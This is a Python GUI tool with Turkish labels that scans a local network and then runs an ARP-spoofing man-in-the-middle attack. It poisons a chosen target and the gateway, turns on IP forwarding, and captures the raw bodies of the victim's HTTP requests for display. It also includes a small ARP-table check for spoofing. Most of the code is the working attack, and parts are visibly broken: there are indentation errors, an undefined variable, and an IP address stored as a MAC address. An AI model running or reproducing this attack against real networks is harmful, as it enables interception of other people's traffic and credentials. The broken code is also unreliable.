import time
import scapy.all as scapy
import subprocess
import os
import re
from threading import Thread
from scapy_http import http
from tkinter import *
from tkinter import messagebox
from PIL import Image
from PIL import ImageTk
import Pmw

def sayfa_1():
    global fr_1
    global mitm
    global fr_8
    global fr_7
    global deneme
    global resim_konum
    global resim
    mitm = Tk()
    mitm.geometry("1000x850+450+50")
    Pmw.initialise(mitm)
    baslık = mitm.title("CappaϽ")
    denemefrm = Frame(mitm,bg="#E6E6E6")
    denemefrm.place(relwidth=1,relheight=1)
    resim_konum = os.getcwd() + os.sep + "cappaclogo.png"
    resim = ImageTk.PhotoImage(Image.open(resim_konum))
    deneme = Button(denemefrm,activebackground="#B40431", image=resim)
    deneme.place(relx=0.21, rely=0.05, relwidth=0.58, relheight=0.39)
    fr_1 = Frame(denemefrm, bg="#D8D8D8")
    fr_1.place(relx=0.15, rely=0.46, relwidth=0.70, relheight=0.12)
    fr_8 = Frame(denemefrm, bg="#D8D8D8")
    fr_8.place(relx=0.15, rely=0.63, relwidth=0.70, relheight=0.12)
    fr_7 = Frame(denemefrm, bg="#D8D8D8")
    fr_7.place(relx=0.15, rely=0.80, relwidth=0.70, relheight=0.12)   
    paket = Button(fr_1, text="Ağ taraması + MITM saldırısı", command=inputs)
    processTooltip1 = Pmw.Balloon(fr_1)
    processTooltip1.bind(paket, "Hedef cihazınızın İp'sini bilmiyorsanız bu yolu kullanın.")
    justattack = Button(fr_8, text="MITM saldırısı", command=mitm_inputs)
    processTooltip2 = Pmw.Balloon(fr_8)
    processTooltip2.bind(justattack, "Hedef cihazınızın İp'sini biliyorsanız bu yolu kullanın.")
    antimitm = Button(fr_7, text="ANTI-MITM",command= lambda : [f() for f in [anti_mitm,anti_mitm_sonuc]])
    processTooltip3 = Pmw.Balloon(fr_7)
    processTooltip3.bind(antimitm, "Mitm saldırısı altında mıyım? Öğrenmek için bu yolu kullanın.")
    paket.place(relx=0.15, rely=0.35, relwidth=0.70, relheight=0.30)
    justattack.place(relx=0.15, rely=0.35, relwidth=0.70, relheight=0.30)
    antimitm.place(relx=0.15, rely=0.35, relwidth=0.70, relheight=0.30)
    mitm.mainloop()



def inputs():
    global onay1
    global fr_2
    global ip_araligi
    global ag_arayuz
    global mini_konum
    global resim_2
    deneme.destroy()
    fr_7.destroy()
    fr_8.destroy()
    fr_1.destroy()
    fr_2= Frame(mitm, bg="#E6E6E6")
    fr_2.place(relwidth=1, relheight= 1)
    mini_konum = os.getcwd() + os.sep + "cappacmini.png"
    resim_2 = ImageTk.PhotoImage(Image.open(mini_konum))
    resim_buton3 = Button(fr_2,activebackground="#B40431", image=resim_2)
    resim_buton3.place(relx=0.07, rely=0.80, relwidth=0.18, relheight=0.13)
    a=Label(fr_2, text="İP aralığı giriniz.",
    				bg="#D8D8D8",font="Cavolini 17").place(relx=0.10, rely=0.30, relwidth=0.40, relheight=0.13)
    b=Label(fr_2, text="Ağ arayüzünüzü giriniz.",
    				bg="#D8D8D8",font="Cavolini 17").place(relx=0.10, rely=0.48, relwidth=0.40, relheight=0.13)
    ip_araligi= StringVar()
    uyarıEntry=Entry(fr_2, textvariable= ip_araligi, font=("Calibri",15,"bold"), 
    				justify= RIGHT,fg="#DF013A")
    uyarıEntry.place(relx=0.57, rely=0.33, relwidth=0.35, relheight=0.07)
    processTooltip = Pmw.Balloon(fr_2)
    processTooltip.bind(uyarıEntry, "Örnek aralık yazımı '10.0.2.1/24' veya '10.0.2.1/16'")
    ag_arayuz= StringVar()
    Entry(fr_2, textvariable= ag_arayuz,font=("Calibri",15,"bold"), 
    				justify= RIGHT, fg="#DF013A").place(relx=0.57, rely=0.51, relwidth=0.35, relheight=0.07)
    onay1= Button(fr_2, text="ONAYLA",font=("Calibri",13,"bold"),
    				bg="#E6E6E6",command= lambda :[f() for f in [networkconnection,arp_request_input,ip_mac_add,agtaramasi] ])
    onay1.place(relx=0.8, rely=0.75, relwidth=0.1, relheight=0.06)

def networkconnection():
    if os.name == "posix":
    	os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")

def arp_request_input():
    global answered_list
    global ip
    global interface
    interface=ag_arayuz.get()
    ip=ip_araligi.get()
    arp_request_packet= scapy.ARP(pdst= ip)
    broadcast_packet= scapy.Ether(dst= "ff:ff:ff:ff:ff:ff")
    combined_packet= broadcast_packet/arp_request_packet
    (answered_list, unanswered_list)= scapy.srp(combined_packet,timeout=1)
    return list(answered_list)

def ip_mac_add():
    global bilgiler
    global hedefler
    global paketler
    psrc=[]
    src=[]
    bilgiler=[]
    liste= list(answered_list)
    liste=str(liste).split()
    for i in liste:
        if "psrc" in i:
        	if "=" in i:
            psrc.append(i[i.index("=")+1:])
        if "hwsrc" in i:
        	if "="  in i:
            src.append(i[i.index("=")+1:])

    for i in range(len(src)):
        bilgiler.append([psrc[i],hwsrc[i]])

    hedefler=""
    for i in range(len(bilgiler)):
        hedefler += "{}. hedefin ip adresi {} ve mac adresi {}\n".format(i+1,psrc[i],src[i])

def agtaramasi():
    global fr_3
    global hedef
    fr_2.destroy()
    fr_3= Frame(mitm, bg="#E6E6E6")
    fr_3.place(relwidth=1, relheight=1)
    resim_buton4 = Button(fr_3,activebackground="#B40431", image=resim_2)
    resim_buton4.place(relx=0.07, rely=0.80, relwidth=0.18, relheight=0.13)
    Label(fr_3,text=hedefler, bg="#D8D8D8",font="Cavolini 13").place(relx=0.18, rely=0.07)
    Label(fr_3,text="Lütfen saldırmak istediğiniz hedefin başındaki numarayı giriniz",
    			bg="#D8D8D8",font="Cavolini 13").place(relx=0.21,rely=0.6,relwidth=0.58,relheight=0.05)
    hedef=IntVar()
    Entry(fr_3, textvariable=hedef,justify= RIGHT,
    			fg="#DF013A",font=("Calibri",13,"bold")).place(relx=0.425, rely=0.67, relwidth=0.15, relheight=0.04)
    onay_2= Button(fr_3, text="ONAYLA",font=("Calibri",13,"bold"),
    			bg="#E6E6E6",command=lambda: [f() for f in [paket_dinleme,thread_kullanimi]])
    onay_2.place(relx=0.8, rely=0.75, relwidth=0.1, relheight=0.06)

def paket_dinleme():
    global target_ip
    global target_mac
    global poisoned_ip
    global poisoned_mac
    global paketler
    hedef2=int(hedef.get())-1
    target_ip=""
    target_mac=""
    poisoned_ip=""
    poisoned_mac=""
    paketler= []
    target_ip= bilgiler[hedef2][0]
    poisoned_ip= bilgiler[0][0]
    target_mac= bilgiler[hedef2][1]
    poisoned_mac= bilgiler[0][0]
   """ for i in bilgiler[hedef2]:
        if "psrc" in i:
            target_ip += i[i.index("=")+1:]
        elif "src" in i:
            target_mac += i[i.index("=")+1:]
    for i in bilgiler[0]:
        if "psrc" in i:
            poisoned_ip += i[i.index("=")+1:]
        elif "src" in i:
            poisoned_mac += i[i.index("=")+1:]"""

def arp_poisoning(target_ip, poisoned_ip, target_mac):
    arp_responce= scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=poisoned_ip)
    scapy.send(arp_responce,verbose=False, count=6)
def reset_operation():
    arp_responce=scapy.ARP(op=2, pdst=target_ip, hwdst= target_mac, psrc=poisoned_ip, hwsrc=poisoned_mac)
    scapy.send(arp_responce,verbose=False, count=6)
def reset_operation_2():
    arp_responce=scapy.ARP(op=2, pdst=poisoned_ip, hwdst= poisoned_mac, psrc=target_ip, hwsrc=target_mac)
    scapy.send(arp_responce,verbose=False, count=6)   


def arp_attack():
    global sayac
    number=0
    while True:
        sayac="0"
        arp_poisoning(target_ip,poisoned_ip,target_mac)
        arp_poisoning(poisoned_ip,target_ip,poisoned_mac)
        number += 2
        sayac=("Sending Packet {}".format(number))
        time.sleep(3)

def listen_packets():
	scapy.sniff(iface= interface, store= False, prn= analyze_packet)
	time.sleep(0.001)


def analyze_packet(packet):

    if packet.haslayer(http.HTTPRequest):
        if packet.haslayer(scapy.Raw):
            paketler.append(packet[scapy.Raw].load)


def yeni_pencere(): 
    global mitm2
    mitm2= Tk()
    mitm2.geometry("1000x850+450+50")
    baslık2 = mitm2.title("CappaϽ")
    fr_6=Frame(mitm2,bg="#E6E6E6")
    fr_6.place(relwidth=1, relheight=1)
    mini_konum2 = os.getcwd() + os.sep + "cappacmini.png"
    resim_3 = ImageTk.PhotoImage(Image.open(mini_konum2))
    resim_buton5 = Button(fr_6,activebackground="#B40431", image=resim_3)
    resim_buton5.place(relx=0.07, rely=0.80, relwidth=0.18, relheight=0.13)
    bitir = Button(fr_6, text="Sayfayı kapat",bg="#E6E6E6",font=("Calibri",13,"bold"), 
    						command=lambda: [f() for f in [reset_operation,reset_operation_2,mitm2.destroy]])
    bitir.place(relx=0.72, rely=0.8, relwidth=0.18, relheight=0.085)
    mitm2.mainloop()


def label_send():
	global fr_4

	while True:

		fr_4=Frame(mitm2, bg="#D8D8D8")
		fr_4.place(relx=0.73,rely=0.68,relwidth=0.165,relheight=0.04)
		fr_5=Frame(mitm2, bg="#DF013A")
		fr_5.place(rely=0.10, relwidth=1, relheight=0.55)
		kaydirma = Scrollbar(fr_5)
		kaydirma.pack(side="bottom", fill="x")
		dinlenenler = Listbox(fr_5)
		dinlenenler.place(rely=0.005,relwidth=1,relheight=0.964)
		kaydirma.config(orient="horizontal",command=dinlenenler.xview)
		dinlenenler.config(xscrollcommand=kaydirma.set)

		for i in paketler:
			dinlenenler.insert(END, i)

		sending_label= Label(fr_4, text=sayac).pack()

		time.sleep(3)
		fr_4.destroy()
		fr_5.destroy()
    

def thread_kullanimi():
    mitm.destroy()
    if __name__ == "__main__":
        attack= Thread(target= arp_attack, daemon=True)
        sniff= Thread(target= listen_packets, daemon=True)
        pencere_new = Thread(target= yeni_pencere)
        labelsend = Thread(target= label_send, daemon=True)
        pencere_new.start()
        attack.start()
        sniff.start()
        labelsend.start()


def mitm_inputs():
    global onay3
    global fr_2
    global saldırı_ip
    global modem_ip
    global ag_arayuz
    global resim_4
    global mini_konum3
    deneme.destroy()
    fr_7.destroy()
    fr_8.destroy()
    fr_1.destroy()
    fr_2= Frame(mitm, bg="#E6E6E6")
    fr_2.place(relwidth=1, relheight=1)
    mini_konum3 = os.getcwd() + os.sep + "cappacmini.png"
    resim_4 = ImageTk.PhotoImage(Image.open(mini_konum3))
    resim_buton6 = Button(fr_2, activebackground="#B40431", image=resim_4)
    resim_buton6.place(relx=0.07, rely=0.80, relwidth=0.18, relheight=0.13)
    x=Label(fr_2, text="Hedefin ip numarasını giriniz",
    				bg="#D8D8D8",font="Cavolini 16").place(relx=0.10, rely=0.21, relwidth=0.40, relheight=0.13)
    y=Label(fr_2, text="Modemin ip numarasını giriniz",
    				bg="#D8D8D8",font="Cavolini 16").place(relx=0.10, rely=0.39, relwidth=0.40, relheight=0.13)
    z=Label(fr_2, text="Ağ arayüzünüzü giriniz",
    				bg="#D8D8D8",font="Cavolini 16").place(relx=0.10, rely=0.57, relwidth=0.40, relheight=0.13)
    saldırı_ip= StringVar()
    Entry(fr_2, textvariable= saldırı_ip, font=("Calibri",15,"bold"), 
    				justify= RIGHT,fg="#DF013A").place(relx=0.57, rely=0.24, relwidth=0.35, relheight=0.07)
    modem_ip= StringVar()
    Entry(fr_2, textvariable= modem_ip, font=("Calibri",15,"bold"), 
    				justify= RIGHT, fg="#DF013A").place(relx=0.57, rely=0.42, relwidth=0.35, relheight=0.07)
    ag_arayuz= StringVar()
    Entry(fr_2, textvariable= ag_arayuz, font=("Calibri",15,"bold"), 
    				justify= RIGHT, fg="#DF013A").place(relx=0.57, rely=0.60, relwidth=0.35, relheight=0.07)

    onay3= Button(fr_2, text="ONAYLA",font=("Calibri",13,"bold"),
    				bg="#E6E6E6",command= lambda: [f() for f in [networkconnection,mitm_mac,thread_kullanimi]])
    onay3.place(relx=0.8, rely=0.77, relwidth=0.1, relheight=0.06)


def mitm_mac():
    global paketler
    global target_ip
    global target_mac
    global poisoned_ip
    global poisoned_mac
    global interface
    paketler=[]
    target_ip=saldırı_ip.get()
    poisoned_ip= modem_ip.get()
    target_mac= mac_adresigetir(target_ip)
    poisoned_mac= mac_adresigetir(poisoned_ip)
    interface= ag_arayuz.get()
    


def mac_adresigetir(ip):
    arp_request_packet= scapy.ARP(pdst=ip)
    broadcast_packet= scapy.Ether(dst= "ff:ff:ff:ff:ff:ff")
    combined_packet= broadcast_packet/arp_request_packet
    answered_list = scapy.srp(combined_packet,timeout=1,verbose=False)[0]

    return answered_list[0][1].hwsrc


def anti_mitm():
    global hata
    hata=[]
    değişken = subprocess.check_output(["arp","-a"])
    veriler=""
    for i in değişken:
        veriler += chr(i)

    if os.name == "posix":
        ip=[]
        mac=[]
        liste = re.split("wlan0|eth0",veriler)
        for i in range(len(liste)):
            liste[i] = liste[i].split(" ")
        for x in range(len(liste)):
            for i in liste[x]:
                if i.count(":") == 5 or i.count("-") == 5:
                    mac.append(i)
                elif i.count(".") >= 3:
                    ip.append(i)
                else:
                    continue
        for a in range(len(mac)):
            if mac.count(mac[a]) > 1:
                if ip.count(ip[a]) ==1:
                    hata.append([ip[a],mac[a]])


    elif os.name == "nt":
        deneme = veriler.split("\r\n")
        dynamic = []
        for i in deneme:
            if "dynamic" in i:
                dynamic.append(i)
        deneme3=""
        for i in dynamic:
            deneme3+=i
        deneme3 =deneme3.split()
        for i in range(len(deneme3)):
            if deneme3[i]!= "dynamic":
                if deneme3.count(deneme3[i]) > 1:
                    hata.append([deneme3[i-1] , deneme3[i]])
    return hata

def anti_mitm_sonuc():
    deneme.destroy()
    fr_1.destroy()
    fr_7.destroy()
    fr_8.destroy()
    fr_10= Frame(mitm,bg="#E6E6E6")
    fr_10.place(relwidth=1, relheight=1)
    if len(hata) == 0:
        Label(fr_10, text=" BURADA TEK BAŞINASIN! \nSaldırı altında değilsin.", 
        				bg="#D8D8D8",font="Cavolini 19").place(relx=0.335, rely=0.12)
    else:
        Label(fr_10, text= "BURADA YALNIZ DEĞİLSİN :( \n"
                           "{} ip adresi ile {} ip adresinin mac adreslerinde eşleşme bulundu.".format(hata[0][0],hata[1][0]),
                           bg="#D8D8D8",font="Cavolini 16").place(relx=0.075, rely=0.12)
    fr_12= Frame(mitm).place(relx=0.21, rely=0.42, relwidth=0.58, relheight=0.39)
    resim_buton2 = Button(fr_12,activebackground="#DF013A", image=resim)
    resim_buton2.place(relx=0.21, rely=0.42, relwidth=0.58, relheight=0.39)
    geri_dön = Button(fr_10, text="Ana menüye geri dön",bg="#E6E6E6", font=("Calibri",14,"bold"),
    							command= lambda: [f() for f in [mitm.destroy,sayfa_1]] )
    geri_dön.place(relx=0.375, rely=0.26, relwidth=0.25, relheight=0.04) 

sayfa_1()
